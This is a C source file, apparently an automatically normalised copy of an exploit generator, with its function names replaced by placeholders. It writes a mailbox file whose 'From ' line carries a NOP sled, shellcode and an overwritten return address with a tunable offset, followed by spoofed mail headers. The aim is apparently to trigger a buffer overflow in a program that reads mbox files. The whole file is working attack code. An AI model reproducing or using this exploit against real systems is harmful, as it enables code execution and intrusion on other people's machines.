#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int LEN ; 
 int /*<<< orphan*/  NOP ; 
 long RET ; 
 long FUNC0 (char*) ; 
 char* code ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC3 (char*,char*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC5 (char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 char FUNC7 (int,char**,char*) ; 
 char* FUNC8 (int) ; 
 char* optarg ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/ * stdout ; 
 int /*<<< orphan*/  FUNC10 (char*,char*) ; 
 int /*<<< orphan*/  FUNC11 (char*,char*) ; 
 int FUNC12 (char*) ; 

int FUNC13(int argc, char **argv) {
  int i = 0, offset = 0;
  char ch, *mfile = NULL, *p = NULL, buf[5 + LEN + 6 + 2 + 3 + 1 + 3 + 2 + 1 + 8 + 1 + 4 + 2];  // From %s@foo.bar  Thu Jun 26 16:45:16 2003\n\0
  long ret = RET, *paddr = NULL;
  FILE *fd;
  
  if(argc < 2) {
    FUNC4(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
    FUNC1(1);
  }

  while((ch = FUNC7(argc, argv, "m:o:h")) != -1) {
    switch(ch) {
      case 'h':
        FUNC4(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
        FUNC1(1);
      break;

      case 'o':
        ret -= FUNC0(optarg);
      break;

      case 'm':
        if(!(mfile = FUNC8(FUNC12(optarg)+1))) {
          FUNC9("malloc");
          FUNC1(1);
        }
        FUNC11(mfile, optarg);
      break; 
    }
  }

  if(!mfile) {
    FUNC4(stderr, "usage: %s <-m outfile> [-o offset] [-h]\n", argv[0]);
    FUNC1(1);
  }

  FUNC4(stderr, "[+] ret 0x%lx\n", ret);

  FUNC11(buf, "From ");
  p = buf + 5;

  // nops
  for(i=0; i<LEN-FUNC12(code)-4; i++)
    *(p++) = NOP;

  // shellcode
  for(i=0; i<FUNC12(code); i++)
    *(p++) = code[i];

  // address
  paddr = (long *)p;
  for(i=0; i<4; i+=4)
    *(paddr++) = ret;

  // terminate and concatenate
  *(p+4) = 0;
  FUNC10(buf, "@foo.bar  Thu Jun 26 16:45:16 2003\n");
  
  // check for an outfile, otherwise send to stdout
  if(mfile) {
    if(!(fd = FUNC3(mfile, "a"))) {
      FUNC9("fopen");
      FUNC1(1);
    }
    FUNC4(stderr, "[+] out %s\n", mfile);
  } else {
    fd = stdout;
    FUNC4(stderr, "[+] out stdout\n");
  }

  FUNC5(buf, fd); 
  FUNC5("Return-Path: <root@foo.bar>\n", fd);
  FUNC5("Received: from localhost (localhost [127.0.0.1])", fd);
  FUNC5("\tby localhost (8.12.4/8.12.4) with ESMTP id h5QNPG2q003945\n", fd);
  FUNC5("\tfor <root@foo.bar>; Thu, 26 Jun 2003 16:45:16 -0700\n", fd);
  FUNC5("Received: (from root@foo.bar)\n", fd);
  FUNC5("\tby localhost (8.12.4/8.12.4/Submit) id h5QNPGuc004172\n", fd);
  FUNC5("\tfor root; Thu, 26 Jun 2003 16:45:16 -0700\n", fd);
  FUNC5("Date: Thu, 26 Jun 2003 16:45:12 -0700\n", fd);
  FUNC5("From: root@foo.bar\n", fd);
  FUNC5("Message-Id: <200306262325.h5QNPGuc003744@localhost>\n", fd);
  FUNC5("To: root@foo.bar\n", fd);
  FUNC5("Subject: foobar\n\n", fd);
  FUNC5("foobar\n\n", fd);

  FUNC2(fd);
  FUNC6(mfile);
  FUNC1(0);
}